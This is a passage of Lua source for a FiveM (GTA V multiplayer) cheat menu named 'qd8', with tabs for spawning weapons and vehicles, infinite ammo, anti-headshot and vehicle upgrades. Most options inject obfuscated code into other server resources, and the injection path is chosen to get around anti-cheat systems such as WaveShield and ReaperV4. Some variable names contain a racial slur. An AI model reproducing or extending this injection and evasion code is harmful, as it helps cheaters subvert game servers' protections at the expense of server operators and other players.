                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Throwables", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_ball", "weapon_flare", "weapon_smokegrenade", "weapon_bzgas", "weapon_petrolcan" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        }
                    }
                },
                {
                    label = "Combat",
                    tabs = {
                        { type = "button", label = "Test Button",
                        onSelect = function()
                        print('hi')
                        end
                        },
                        { type = "checkbox", label = "Infinite Ammo ", desc = "Infinite Ammo, this might be detected on certain servers", checked = false,
                            onSelect = function(checked)
                                if checked then
                                self:Notify("success", "qd8", "Enabled Infinite Ammo", 5000)
                                    self:EnableInfiniteAmmo()
                                else
                                self:Notify("error", "qd8", "Disabled Infinite Ammo", 5000)                                    
                                    self:DisableInfiniteAmmo()
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Headshot",
                            checked = false,
                            desc = "This will prevent you from being headshot.",
                            onSelect = function(checked)
                                if checked then
                                    self:Notify("success", "qd8", "Enabled Anti-Headshot", 5000)
                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor"
                                                or GetResourceState("ox_lib") == "started" and "ox_lib"
                                                or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]])
                                    end

                                else
                                    self:Notify("error", "qd8", "Disabled Anti-Headshot", 5000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor"
                                                or GetResourceState("ox_lib") == "started" and "ox_lib"
                                                or "any",
                                        [[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]])
                                    else
                                        Injection("any", [[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]])
                                    end
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Vehicle",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {
                        { type = "checkbox", label = "Teleport Into", desc = "If selected, this will teleport you into the selected vehicle.", checked = false,
                            onSelect = function(checked)
                                TeleportInto = checked or false
                            end
                        },
                        { type = "checkbox", label = "Delete Previous", desc = "If selected, this will delete your previous vehicle when spawning selected vehicle.", checked = false,
                            onSelect = function(checked)
                                DeletePrevious = checked or false
                            end
                        },
                        { type = "divider", label = "All Vehicles" },
                        { type = "button", label = "Addon",
                            onSelect = function()
                                KeyboardInput("Addon Vehicle", "", function(val)
                                    if val and val ~= "" then
                                        self:SpawnSelectedVehicle(val, TeleportInto, DeletePrevious)
                                    end
                                end, "typeable")
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Compacts",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "asbo", "blista", "brioso", "brioso2", "brioso3", "club", "dilettante", "dilettante2", "issi2", "issi3", "issi4", "issi5", "issi6", "kanjo", "panto", "prairie", "rhapsody", "weevil" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sedans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "asea", "asea2", "asterope", "asterope2", "cinquemila", "driftchavosv6", "cog55", "cog552", "cognoscenti", "cognoscenti2", "deity", "hardy", "drifthardy", "emperor", "emperor2", "emperor3", "fugitive", "glendale", "glendale2", "impaler5", "ingot", "intruder", "minimus", "limo2", "premier", "primo", "primo2", "regina", "rhinehart", "romero", "schafter2", "schafter5", "schafter6", "stafford", "stanier", "stratum", "stretch", "superd", "surge", "tailgater", "tailgater2", "warrener", "warrener2", "washington" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "SUVs",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "aleutian", "astron", "baller", "baller2", "baller3", "baller4", "baller5", "baller6", "baller7", "baller8", "bjxl", "cavalcade", "cavalcade2", "cavalcade3", "contender", "dorado", "dubsta", "dubsta2", "everon3", "fq2", "granger", "granger2", "gresley", "habanero", "huntley", "issi8", "iwagen", "jubilee", "landstalker", "landstalker2", "mesa", "mesa2", "novak", "patriot", "patriot2", "radi", "rebla", "rocoto", "seminole", "seminole2", "serrano", "squaddie", "toros", "vivanite", "woodlander", "xls", "xls2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Coupes",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "cogcabrio", "driftfr36", "exemplar", "f620", "felon", "felon2", "fr36", "jackal", "kanjosj", "oracle", "oracle2", "postlude", "previon", "sentinel", "sentinel2", "windsor", "windsor2", "zion", "zion2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Muscles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "blade", "brigham", "broadway", "buccaneer", "buccaneer2", "buffalo4", "buffalo5", "chino", "chino2", "clique", "clique2", "coquette3", "deviant", "dominator", "dominator2", "dominator3", "dominator4", "dominator5", "dominator6", "dominator7", "dominator8", "dominator9", "driftdominator10", "driftyosemite", "dukes", "dukes2", "dukes3", "ellie", "eudora", "faction", "faction2", "faction3", "gauntlet", "gauntlet2", "gauntlet3", "gauntlet4", "gauntlet5", "driftgauntlet4", "greenwood", "hermes", "hotknife", "hustler", "impaler", "impaler2", "impaler3", "impaler4", "impaler6", "imperator", "imperator2", "imperator3", "lurcher", "manana2", "moonbeam", "moonbeam2", "nightshade", "peyote2", "phoenix", "picador", "ratloader", "ratloader2", "ruiner", "ruiner2", "ruiner3", "ruiner4", "sabregt", "sabregt2", "slamvan", "slamvan2", "slamvan3", "slamvan4", "slamvan5", "slamvan6", "stalion", "stalion2", "tahoma", "tampa", "tampa3", "tampa4", "tulip", "tulip2", "vamos", "vigero", "vigero2", "vigero3", "virgo", "virgo2", "virgo3", "voodoo", "voodoo2", "weevil2", "yosemite", "yosemite2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports Classic",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "ardent", "btype", "btype2", "btype3", "casco", "cheburek", "cheetah2", "cheetah3", "coquette2", "deluxo", "dynasty", "fagaloa", "feltzer3", "gt500", "infernus2", "jb700", "jb7002", "mamba", "manana", "michelli", "monroe", "nebula", "peyote", "peyote3", "pigalle", "rapidgt3", "retinue", "retinue2", "savestra", "stinger", "stingergt", "stromberg", "swinger", "toreador", "torero", "tornado", "tornado2", "tornado3", "tornado4", "tornado5", "tornado6", "turismo2", "viseris", "z190", "zion3", "ztype" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports",
                            type = "scrollable",
                            value = 1,
                            values = { "alpha", "banshee", "bestiagts", "blista2", "blista3", "buffalo", "buffalo2", "buffalo3", "calico", "carbonizzare", "comet2", "comet3", "comet4", "comet5", "comet6", "comet7", "coquette", "coquette4", "corsita", "coureur", "cypher", "drafter", "drifteuros", "driftfuto", "driftjester", "driftremus", "drifttampa", "driftzr350", "elegy", "elegy2", "euros", "everon2", "feltzer2", "flashgt", "furoregt", "fusilade", "futo", "futo2", "gauntlet6", "gb200", "growler", "hotring", "imorgon", "issi7", "italigto", "italirsx", "jester", "jester2", "jester3", "jester4", "jugular", "khamelion", "komoda", "kuruma", "kuruma2", "locust", "lynx", "massacro", "massacro2", "neo", "neon", "ninef", "ninef2", "omnis", "omnisegt", "panthere", "paragon", "paragon2", "pariah", "penumbra", "penumbra2", "r300", "raiden", "rapidgt", "rapidgt2", "rapidgt4", "raptor", "remus", "revolter", "rt3000", "ruston", "schafter3", "schafter4", "schlagen", "schwarzer", "sentinel3", "sentinel4", "sentinel5", "seven70", "sm722", "specter", "specter2", "stingertt", "streiter", "sugoi", "sultan", "sultan2", "sultan3", "surano", "tampa2", "tenf", "tenf2", "tropos", "vectre", "verlierer2", "veto", "veto2", "vstr", "zr350", "zr380", "zr3802", "zr3803" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Super",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "adder", "autarch", "banshee2", "bullet", "champion", "cheetah", "cyclone", "deveste", "emerus", "entity2", "entity3", "entityxf", "fmj", "furia", "gp1", "ignus", "infernus", "italigtb", "italigtb2", "krieger", "le7b", "lm87", "nero", "nero2", "osiris", "penetrator", "pfister811", "prototipo", "reaper", "s80", "sc1", "scramjet", "sheava", "sultanrs", "suzume", "t20", "taipan", "tempesta", "tezeract", "thrax", "tigon", "torero2", "turismo3", "turismor", "tyrant", "tyrus", "vacca", "vagner", "vigilante", "virtue", "visione", "voltic", "voltic2", "xa21", "zeno", "zentorno", "zorrusso" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Motorcycles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "akuma", "avarus", "bagger", "bati", "bati2", "bf400", "carbonrs", "chimera", "cliffhanger", "daemon", "daemon2", "deathbike", "deathbike2", "deathbike3", "defiler", "diablous", "diablous2", "double", "enduro", "esskey", "faggio", "faggio2", "faggio3", "fcr", "fcr2", "gargoyle", "hakuchou", "hakuchou2", "hexer", "innovation", "lectro", "manchez", "manchez2", "manchez3", "nemesis", "nightblade", "oppressor", "oppressor2", "pcj", "powersurge", "ratbike", "reever", "rrocket", "ruffian", "sanchez", "sanchez2", "sanctus", "shinobi", "shotaro", "sovereign", "stryder", "thrust", "vader", "vindicator", "vortex", "wolfsbane", "zombiea", "zombieb" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Off-Road",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bfinjection", "bifta", "blazer", "blazer2", "blazer3", "blazer4", "blazer5", "bodhi2", "boor", "brawler", "bruiser", "bruiser2", "bruiser3", "brutus", "brutus2", "brutus3", "caracara", "caracara2", "dloader", "draugur", "driftl352", "dubsta3", "dune", "dune2", "dune3", "dune4", "dune5", "freecrawler", "hellion", "insurgent", "insurgent2", "insurgent3", "kalahari", "kamacho", "l35", "l352", "marshall", "menacer", "mesa3", "monster", "monster3", "monster4", "monster5", "monstrociti", "nightshark", "outlaw", "patriot3", "rancherxl", "rancherxl2", "ratel", "rcbandito", "rebel", "rebel2", "riata", "sandking", "sandking2", "technical", "technical2", "technical3", "terminus", "trophytruck", "trophytruck2", "vagrant", "verus", "winky", "yosemite3", "zhaba" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Industrial",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bulldozer", "cutter", "dump", "flatbed", "flatbed2", "guardian", "handler", "mixer", "mixer2", "rubble", "tiptruck", "tiptruck2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Utility",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "airtug", "armytanker", "armytrailer", "armytrailer2", "baletrailer", "boattrailer", "boattrailer2", "boattrailer3", "caddy", "caddy2", "caddy3", "docktrailer", "docktug", "forklift", "freighttrailer", "graintrailer", "mower", "proptrailer", "raketrailer", "ripley", "sadler", "sadler2", "scrap", "slamtruck", "tanker", "tanker2", "towtruck", "towtruck2", "towtruck3", "towtruck4", "tr2", "tr3", "tr4", "tractor", "tractor2", "tractor3", "trailerlarge", "trailerlogs", "trailers", "trailers2", "trailers3", "trailers4", "trailers5", "trailersmall", "trflat", "tvtrailer", "tvtrailer2", "utillitruck", "utillitruck2", "utillitruck3" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Vans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bison", "bison2", "bison3", "bobcatxl", "boxville", "boxville2", "boxville3", "boxville4", "boxville5", "boxville6", "burrito", "burrito2", "burrito3", "burrito4", "burrito5", "camper", "gburrito", "gburrito2", "journey", "journey2", "minivan", "minivan2", "paradise", "pony", "pony2", "rumpo", "rumpo2", "rumpo3", "speedo", "speedo2", "speedo4", "speedo5", "surfer", "surfer2", "surfer3", "taco", "youga", "youga2", "youga3", "youga4" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                    }
                },
                {
                    label = "Vehicle Customization",
                    tabs = {
                        -- { type = "button", label = "test button",
                        --     onSelect = function()
                        --         self:RepairVehicle()
                        --     end
                        -- },

                    -- { type = "checkbox", label = "Test", checked = false,
                    --     onSelect = function(checked)
                    --         if checked then
                    --             print("on")
                    --         else
                    --             print("off")
                    --         end
                    --     end
                    -- },
                        {
                            type = "button",
                            label = "Set License Plate",
                            onSelect = function()
                                KeyboardInput("Set License Plate", "", function(val)
                                    if val and val ~= "" then
                                        local injectedCode = string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]], val)

                                        MachoInjectResourceRaw("any", injectedCode)
                                    else
                                        qd8:Notify("Invalid input", "Please enter a valid license plate.", "error")
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Repair Vehicle",
                            onSelect = function()
                                self:RepairVehicle()
                            end
                        },
                        { type = "button", label = "Clean Vehicle",
                            onSelect = function()
                            qd8:Notify("success", "qd8", "Cleaned Vehicle", 3000)
                            MachoInjectResourceRaw("any", [[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]])
                            end
                        },
                        { type = "button", label = "Force Vehicle Engine",
                            onSelect = function()
                            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]])
                        end, function()
                            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]])
                            end
                        },
                        { type = "button", label = "Max Upgrade",
                            onSelect = function()
                            qd8:Notify("success", "qd8", "Vehicle Max Upgraded", 3000)
                            local WaveNiggaStarted = GetResourceState("WaveShield") == 'started'
                            local ReaperNiggaStarted = GetResourceState("ReaperV4") == 'started'
                            if WaveNiggaStarted then
                            print("WaveNiggaStarted")
                            MachoInjectResourceRaw("any", [[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]])
                            elseif ReaperNiggaStarted then
                            print("using Reaper fallback")
                            MachoInjectThread(0, "any", "", [[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]])
                        else
                            MachoInjectResourceRaw("any", [[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

